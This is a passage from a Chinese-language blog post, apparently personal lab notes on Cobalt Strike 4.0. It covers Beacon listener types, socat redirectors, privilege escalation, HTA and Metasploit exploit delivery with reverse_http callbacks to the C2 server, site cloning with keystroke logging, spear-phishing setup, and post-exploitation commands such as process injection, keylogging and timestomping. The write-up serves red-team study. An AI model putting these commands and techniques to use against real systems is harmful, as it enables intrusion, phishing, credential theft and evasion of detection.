C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><h2 id="3、DNS-Beacon"><a href="#3、DNS-Beacon" class="headerlink" title="3、DNS Beacon"></a>3、DNS Beacon</h2><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p><p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p><blockquote><p>以上内容摘自 A-TEAM 团队的 CS 4.0 用户手册</p></blockquote><p>DNS Beacon的工作流程具体如下：</p><p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p><p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p><p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon什么的会更慢。</p><p><strong>域名配置</strong></p><p>既然是配置域名，所以就需要先有个域名，这里就用我的博客域名作为示例：添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-1.png"></p><p>添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-2.png"></p><p>根据上一章的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-3.png"></p><p>然后经过一段时间的等待，就可以发现已经上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-4.png"></p><h2 id="4、SMB-Beacon"><a href="#4、SMB-Beacon" class="headerlink" title="4、SMB Beacon"></a>4、SMB Beacon</h2><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-1.png"></p><p>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p><p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p><p><strong>SMB Beacon 配置</strong></p><p>首先需要一个上线的主机，这里我使用的HTTP Beacon，具体如何上线，可以参考之前第5节《如何建立Payload处理器》学习笔记中的内容，这里不过多赘述。</p><p>主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-2.png"></p><p>接下来在Beacon中直接输入<code>spawn SMB</code>，这里的<code>SMB</code>指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-3.png"></p><p>等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个<code>∞∞</code>字符。</p><p>接下来我这里将SMB Beacon插入到进程中，以vmtoolsed进程为例。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-4.png"></p><p>在vmtoolsed中插入SMB Beacon后，便能看到process为vmtoolsed.exe的派生SMB Beacon。</p><p>当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-5.png"></p><p>在CS中，如果获取到目标的管理员权限，在用户名后会有<code>*</code>号标注，通过这个区别，可以判断出当前上线的test用户为普通权限用户，因此这里给他提升一下权限。</p><p><strong>提权</strong></p><blockquote><p>由于下面与上面内容的笔记不是在同一天写的，因此截图中上线的主机会有所差异，这里主要是记录使用的方法。</p></blockquote><p>由于CS自带的提权方式较少，因此这里就先加载一些网上的提权脚本，脚本下载地址为：<a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></p><p>下载之后，打开<code>Cobalt Strike --&gt; Script Manager</code> ，之后点击<code>Load</code>，选择自己刚才下载的文件中的<code>elevate.cna</code>文件。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-6.png"></p><p>接着选择要提权的主机，右击选择<code>Access --&gt; Elevate</code>，Listener中选择刚才新建的SMB Beacon，这里的Exploit选择了ms14-058，如果使用ms14-058不能提权，就换一个Exploit进行尝试。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-7.png"></p><p>顺利的情况下，就可以看到提权后的管理员权限会话了，在管理员权限的会话中，不光用户名后有个*号，其Logo也是和其他会话不同的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-8.png"></p><p><strong>连接与断开</strong></p><p>此时如果想断开某个会话的连接，可以使用unlink命令，比如如果想断开192.168.175.144，就可以在Beacon中输入<code>unlink 192.168.175.144</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-9.png"></p><p>如果想再次连上，就直接输入<code>link 192.168.175.144</code>，想从当前主机连到其他主机也可以使用此命令。</p><h2 id="5、重定向器"><a href="#5、重定向器" class="headerlink" title="5、重定向器"></a>5、重定向器</h2><p>重定向器<code>Redirectors</code>是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。</p><pre><code>目标靶机 &lt;--------&gt;多个并列的重定向器&lt;------&gt;CS服务器</code></pre><p>重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：</p><ul><li>保护自己的CS服务器，避免目标发现自己的真实IP</li><li>提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的</li></ul><p><strong>创建一个重定向器</strong></p><p>这里就使用自己的内网环境作为测试了，首先理清自己的IP</p><p>CS服务器IP：192.168.175.129</p><p>目标靶机IP：192.168.175.130</p><p>重定向器IP：192.168.175.132、192.168.175.133</p><p>首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：</p><pre><code>socat TCP4-LISTEN:80,fork TCP4:192.168.175.129:80</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-7.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-6.png"></p><p>如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-8.png"></p><p>此时可以测试一下重定向器是否正常工作，在CS中打开 View –&gt; Web Log，之后浏览器访问CS服务器地址，也就是这里的192.168.175.129</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-9.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-10.png"></p><p>可以看到CS是能够正常接收到流量的，说明重定向器已经配置OK了，此时按照上面创建一个HTTP Beacon的操作，创建一个HTTP Beacon，并在靶机中运行</p><p>当靶机上线的时候，观察靶机中的流量，可以看到与靶机连接的也是重定向器的IP</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-11.png"></p><p>在CS中也可以看到上线主机的外部IP也是重定向器的IP，此时如果关闭一个重定向器，系统依旧可以正常工作。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-12.png"></p><p>由于笔者在学习CS过程中，所看的教程使用的是3.x版本的CS，而我使用的是4.0版本的CS。因此域名配置实操部分是自己参考网上大量文章后自己多次尝试后的结果，所以难免出现错误之处，要是表哥发现文中错误的地方，欢迎留言指正。</p><h2 id="6、攻击载荷安全特性"><a href="#6、攻击载荷安全特性" class="headerlink" title="6、攻击载荷安全特性"></a>6、攻击载荷安全特性</h2><p>1、在Beacon传输Payload到目标上执行任务时都会先验证团队服务器，以确保Beacon只接受并只运行来自其团队服务器的任务，并且结果也只能发送到其团队服务器。</p><p>2、在刚开始设置Beacon Payload时，CS会生成一个团队服务器专有的公私钥对，这个公钥嵌入在Beacon的Payload Stage中。Beacon使用团队服务器的公钥来加密传输的元数据，这个元数据中一般包含传输的进程ID、目标系统IP地址、目标主机名称等信息，这也意味着只有团队服务器才能解密这个元数据。</p><p>3、当Beacon从团队服务器下载任务或团队服务器接收Beacon输出时，团队服务器将会使用Beacon生成的会话秘钥来加密任务并解密输出。</p><p>4、值得注意的是，Payload Stagers 因为其体积很小，所以没有这些的安全特性。</p><h1 id="0x03-目标攻击"><a href="#0x03-目标攻击" class="headerlink" title="0x03 目标攻击"></a>0x03 目标攻击</h1><h2 id="1、客户端攻击"><a href="#1、客户端攻击" class="headerlink" title="1、客户端攻击"></a>1、客户端攻击</h2><p><strong>什么是客户端攻击</strong></p><p>客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。</p><p><code>原文：A client-side attack is an attack against an application used to view attacker controlled content.</code></p><p><strong>为什么要进行客户端攻击</strong></p><p>随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p><p>而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点<code>foothold</code>。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。</p><p><strong>如何获得客户端上的立足点</strong></p><p>1、尽可能多的了解目标环境，即做好信息收集工作</p><p>2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致</p><p>3、攻击刚刚创建的虚拟机，这会是最好的攻击目标</p><p>4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果</p><p>5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件</p><p>如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。</p><h2 id="2、系统侦察"><a href="#2、系统侦察" class="headerlink" title="2、系统侦察"></a>2、系统侦察</h2><p>系统侦察<code>System Profiler</code>是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p><p>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择<code>System Profiler</code>功能模块，配置待跳转的URL等信息即可。</p><p>如果勾选了<code>Use Java Applet to get information</code>则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-1.png"></p><p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p><pre><code>1、View --&gt; Applications2、View --&gt; Web Log3、Cobalt Strike --&gt; Visualization --&gt; Target Table</code></pre><p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-2.png"></p><p>值得注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h2 id="3、Cobalt-Strike-的攻击方式"><a href="#3、Cobalt-Strike-的攻击方式" class="headerlink" title="3、Cobalt Strike 的攻击方式"></a>3、Cobalt Strike 的攻击方式</h2><p><strong>用户驱动攻击</strong></p><p>用户驱动攻击<code>User-Driven Attacks</code>需要欺骗用户产生交互才行，但也有许多的优点。</p><p>首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。</p><p>当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：</p><h3 id="用户驱动攻击包"><a href="#用户驱动攻击包" class="headerlink" title="用户驱动攻击包"></a>用户驱动攻击包</h3><p>用户驱动攻击包<code>User-Driven Attacks Packages</code>功能打开位置：<code>Attacks --&gt; Packages</code></p><p><strong>1、HTML应用</strong></p><p>HTML应用<code>HTML Application</code>生成(executable/VBA/powershell)这3种原理不同的VBScript实现的<code>evil.hta</code>文件。</p><p><strong>2、Microsoft Office 宏文件</strong></p><p>Microsoft Office 宏文件<code>Microsoft Office Document Macros</code>可以生成恶意宏放入office文件，非常经典的攻击手法。</p><p><strong>3、Payload 生成器</strong></p><p>Payload生成器<code>Payload Generator</code>可以生成各种语言版本的Payload，便于进行免杀。</p><p><strong>4、Windows 可执行文件</strong></p><p>Windows 可执行文件<code>Windows Executable</code> 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</p><p><strong>5、Windows 可执行文件（Stageless）</strong></p><p>Windows 可执行文件（Stageless）<code>Windows Executable (Stageless)</code>会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</p><h3 id="用户驱动的Web交付攻击"><a href="#用户驱动的Web交付攻击" class="headerlink" title="用户驱动的Web交付攻击"></a>用户驱动的Web交付攻击</h3><p>用户驱动Web交付攻击<code>User-Driven Web Drive-by Attacks</code>功能打开位置：<code>Attacks --&gt; Web Drive-by</code></p><p><strong>1、java 签名 applet 攻击</strong></p><p>java 签名 applet 攻击<code>Java Signed Applet Attack</code>会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。</p><p><strong>2、Java 智能 Applet 攻击</strong></p><p>Java 智能 Applet 攻击<code>Java Smart Applet Attack</code>会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。</p><p><strong>3、脚本化 Web 交付</strong></p><p>脚本化 Web 交付<code>Scripted Web Delivery</code> 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery</p><p><strong>4、托管文件</strong></p><p>托管文件<code>Host File</code>通过<code>Attacks --&gt; Web Drive-by --&gt; Host File</code>进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。</p><p>如果想删除上传到CS服务端上的文件，可以到<code>Attacks --&gt; Web Drive-by --&gt; Manage</code>下进行删除。</p><p>如果想查看谁访问了这些文件，可以到<code>View --&gt; Web Log</code>下进行查看。</p><h2 id="4、开始攻击"><a href="#4、开始攻击" class="headerlink" title="4、开始攻击"></a>4、开始攻击</h2><h3 id="HTML-应用攻击"><a href="#HTML-应用攻击" class="headerlink" title="HTML 应用攻击"></a>HTML 应用攻击</h3><p>首先来到<code>Attacks --&gt; Packages --&gt; HTML Application</code>创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-3.png"></p><p>HTML应用文件生成好后，来到<code>Attacks --&gt; Web Drive-by --&gt; Host File</code>，选择刚才生成的文件，最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-4.png"></p><p>当在目标主机上提示是否运行时，点击运行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-5.png"></p><p>当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-6.png"></p><h3 id="MSF-与-CS-的结合利用"><a href="#MSF-与-CS-的结合利用" class="headerlink" title="MSF 与 CS 的结合利用"></a>MSF 与 CS 的结合利用</h3><p>如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。</p><p>1、首先在MSF上选择攻击模块</p><p>2、接着在MSF上设置Payload为<code>windows/meterpreter/reverse_http</code>或者<code>windows/meterpreter/reverse_https</code>，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。</p><p>3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。</p><p>4、然后设置 <code>DisablePayloadHandler</code> 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。</p><p>5、再设置 <code>PrependMigrate</code> 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p><p>6、最后运行<code>exploit -j</code>，-j 是指作为job开始运行，即在后台运行。</p><p><strong>操作</strong></p><p>在CS中新建一个HTTP Beacon，创建过程不再赘述。</p><p>1、在MSF中选择攻击模块，根据教程这里选择的<code>adobe_flash_hacking_team_uaf</code>模块，不过个人感觉现在这个模块已经不太能被利用成功了。</p><pre><code>use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></pre><p>2、接着配置payload，这里选择revese_http payload</p><pre><code>set payload windows/meterpreter/revese_httpset LHOST cs_server_ipset LPORT 80</code></pre><p>3、之后，配置<code>DisablePayloadHandler</code>、<code>PrependMigrate</code>为 True</p><pre><code>set DisablePayloadHandler Trueset PrependMigrate True</code></pre><p>4、最后，开始攻击。</p><pre><code>exploit -j</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-1.png"></p><h3 id="伪装—克隆网站"><a href="#伪装—克隆网站" class="headerlink" title="伪装—克隆网站"></a>伪装—克隆网站</h3><p>在向目标发送漏洞程序之前，我们将自己进行伪装一下，这样可以更好的保护自己，同时提高成功率。CS上有个克隆网站的功能，能够较好的帮助到我们。</p><p>首先，来到<code>Attacks --&gt; Web Drive-by --&gt; Clone Site</code>下，打开克隆网站的功能，之后写入待克隆网站的URL，在Attack中写入MSF中生成的URL。</p><p>其中<code>Log keystrokes on cloned site</code>选项如果勾选则可以获取目标的键盘记录，记录结果在Web Log中能够查看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-2.png"></p><p>之后，浏览器打开克隆站点地址，如果目标存在漏洞，就可以被利用了，同时在CS中也会观察到主机上线。</p><h2 id="5、鱼叉式网络钓鱼"><a href="#5、鱼叉式网络钓鱼" class="headerlink" title="5、鱼叉式网络钓鱼"></a>5、鱼叉式网络钓鱼</h2><p>用CS进行钓鱼需要四个步骤：</p><p>1、创建一个目标清单</p><p>2、制作一个邮件模板或者使用之前制作好的模板</p><p>3、选择一个用来发送邮件的邮件服务器</p><p>4、发送邮件</p><p><strong>目标清单</strong></p><p>目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。</p><p>在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。</p><p>这里使用一些在线邮件接收平台的邮箱地址作为示例。</p><pre><code>astrqb79501@chacuo.net    test1gswtdm26180@chacuo.net    test2ypmgin95416@chacuo.net    test3</code></pre><p>将以上内容保存为txt文本文件，就创建好了自己的目标清单。</p><p><strong>模板</strong></p><p>使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。</p><p>首先可以自己写一封邮件发给自己，或者直接从自己收件箱挑选一个合适的。有了合适的邮件之后，查看邮件原始信息，一般在邮件的选项里能找到这个功能。最后将邮件的原始信息保存为文件，一个模板就制作完成了。</p><p><strong>发送邮件</strong></p><p>有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。</p><p>在CS客户端中，点击<code>Attacks --&gt; Spear Phish</code>即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-3.png"></p><p>所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。</p><p>当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-4.png"></p><p>由于此处是仅作为测试用途，所以模板中的链接都是自己的本地内网CS服务器地址，如果是真实环境中，则自然需要使用公网的地址才行。</p><p>在真实环境中的钓鱼邮件也不会像这里这么浮夸，真实环境中的钓鱼邮件往往都伪装成和正经儿的邮件一模一样，单从表面上看很难看出区别，因此提高自己的安全意识还是很重要滴。</p><h1 id="0x04-后渗透"><a href="#0x04-后渗透" class="headerlink" title="0x04 后渗透"></a>0x04 后渗透</h1><h2 id="1、Beacon-的管理"><a href="#1、Beacon-的管理" class="headerlink" title="1、Beacon 的管理"></a>1、Beacon 的管理</h2><p><strong>Beacon 控制台</strong></p><p>在一个 Beacon 会话上右击 <code>interact</code>（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs10-1.png"></p><p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。</p><p>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p><p><strong>Beacon 菜单</strong></p><p>Access：包含了一些对凭据的操作及提权的选项</p><p>Explore：包含了信息探测与目标交互的选项</p><p>Pivoting：包含了一些设置代理隧道的选项</p><p>Session：包含了对当前 Beacon 会话管理的选项</p><p><strong>Beacon 命令</strong></p><p>help：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。</p><p>clear：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。</p><p>sleep：改变 Beacon 的休眠时间。输入 <code>sleep 30</code>表示休眠30秒；输入<code>sleep 60 50</code>表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 <code>sleep 0</code>则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如<code>desktop</code>时， Beacon 会自动进入交互模式。</p><p>shell：通过受害主机的 cmd.exe 执行命令。比如运行<code>ipconfig</code>，就需要输入<code>shell ipconfig</code></p><p>run：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。</p><p>execute：执行命令，但不回显结果。</p><p>cd：切换当前工作目录。</p><p>pwd：查看当前所在目录。</p><p>powershell：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 <code>ipconfig</code>，就需要输入<code>powershell ipconfig</code></p><p>powerpick：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。</p><p>psinject：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。</p><p>powershell-import：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。</p><p>powershell get-help：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入<code>powershell get-help  get-process</code></p><p>execute-assembly：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。</p><p>setenv：设置一个环境变量。</p><h2 id="2、会话传递"><a href="#2、会话传递" class="headerlink" title="2、会话传递"></a>2、会话传递</h2><p><strong>会话传递相关命令</strong></p><p>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</p><p><code>spawn</code>：进行会话的传递，也可直接右击会话选择<code>spawn</code>命令进行会话的选择。默认情况下，<code>spawn</code>命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用<code>spawnto</code>命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</p><p><code>spawnto</code>：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入<code>spawnto</code>命令然后按 enter 会指示 Beacon 恢复至其默认行为。</p><p><code>inject</code>：输入<code>inject + 进程 id + 监听器名</code>来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用<code>inject [pid] x64</code>来将一个64位 Beacon 注入到一个 64位进程中。</p><p><code>spawn</code>和<code>inject</code>命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</p><p><code>dllinject</code>：<code>dllinject + [pid]</code>来将一个反射性 DLL 注入到一个进程中。</p><p><code>shinject</code>：使用<code>shinject [pid] [架构] [/路径/.../file.bin]</code>命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</p><p><code>shspawn</code>：使用<code>shspawn [架构] [/路径/.../file.bin]</code>命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</p><p><code>dllload</code>：使用<code>dllload [pid] [c:\路径\...\file.dll]</code>来在另一个进程中加载磁盘上的 DLL文件。</p><p><strong>会话传递使用场景</strong></p><p>1、将当前会话传递至其他CS团队服务器中，直接右击<code>spawn</code>选择要传递的监听器即可。</p><p>2、将当前会话传递至MSF中，这里简单做一下演示。</p><p>首先，在MSF中，为攻击载荷新建一个payload</p><pre><code>msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httpsmsf5 exploit(multi/handler) &gt; set lhost 192.168.175.156msf5 exploit(multi/handler) &gt; set lport 443msf5 exploit(multi/handler) &gt; exploit -j</code></pre><p>随后，在CS中新建一个外部<code>Foreign</code>监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用<code>spawn</code>选择刚新建的外部监听器，MSF中即可返回会话。</p><h2 id="3、文件系统"><a href="#3、文件系统" class="headerlink" title="3、文件系统"></a>3、文件系统</h2><p>浏览会话系统文件位置在右击会话处，选择 <code>Explore --&gt; File Browser</code>即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p><p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p><p>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p><p><strong>文件下载</strong></p><p><code>download</code>：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</p><p><code>downloads</code>：查看当前 Beacon 正在进行的文件下载列表。</p><p><code>cancel</code>：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</p><p>下载文件都将下载到CS团队服务器中，在<code>View --&gt; Download</code>下可看到下载文件的记录，选中文件后使用<code>Sync Files</code>即可将文件下载到本地。</p><p><strong>文件上传</strong></p><p><code>upload</code>：上传一个文件到目标主机上。</p><p><code>timestomp</code>：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</p><h2 id="4、用户驱动溢出攻击"><a href="#4、用户驱动溢出攻击" class="headerlink" title="4、用户驱动溢出攻击"></a>4、用户驱动溢出攻击</h2><p>Beacon 运行任务的方式是以<code>jobs</code>去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。</p><p><code>jobs</code>：查看当前 Beacon 中的任务</p><p><code>jobkill</code>：加上任务 ID，对指定任务进行停止</p><p><strong>屏幕截图</strong></p><p><code>screenshot</code>：获取屏幕截图，使用<code>screenshot pid</code>来将截屏工具注入到一个 x86 的进程中，使用<code>screenshot pid x64</code>注入到一个 x64 进程中，explorer.exe 是一个好的候选程序。</p><p>使用<code>screenshot [pid] [x86|x64] [time]</code>来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过<code>View --&gt; Screenshots</code>来浏览从所有 Beacon 会话中获取的截屏。</p><p><strong>键盘记录</strong></p><p><code>keylogger</code>：键盘记录器，使用<code>keylogger pid</code>来注入一个 x86 程序。使用<code>keylogger pid 